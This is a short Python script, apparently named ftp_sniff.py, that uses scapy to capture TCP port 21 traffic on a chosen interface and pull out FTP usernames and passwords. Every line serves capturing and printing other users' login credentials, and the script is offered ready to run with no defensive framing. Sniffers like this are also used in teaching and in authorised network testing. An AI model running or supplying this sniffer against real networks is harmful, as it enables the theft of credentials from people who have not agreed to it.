import re
import argparse
from scapy.all import sniff, conf
from scapy.layers.inet import IP


def ftp_sniff(pkt):
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall(f'(?i)USER (.*)', raw)
    pswd = re.findall(f'(?i)PASS (.*)', raw)
    
    if user:
        print(f'[*] Detected FTP Login to {str(dest)}')
        print(f'[+] User account: {str(user[0])}')
        if pswd:
            print(f'[+] Password: {str(pswd[0])}')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        usage='python3 ftp_sniff.py INTERFACE')
    parser.add_argument('iface', type=str, metavar='INTERFACE',
                        help='specify the interface to listen on')
    args = parser.parse_args()
    conf.iface = args.iface
    
    try:
        sniff(filter='tcp port 21', prn=ftp_sniff)
    except KeyboardInterrupt:
        exit(0)
